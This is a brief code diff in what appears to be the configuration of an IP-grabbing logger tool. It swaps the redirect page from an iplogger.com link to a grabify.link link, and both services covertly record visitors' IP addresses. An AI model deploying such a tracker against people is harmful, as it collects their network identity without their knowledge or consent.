@@ -52,7 +52,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://iplogger.com/2tNqZ6" # Link to the webpage to redirect to 
+        "page": "https://grabify.link/5XJXT3" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
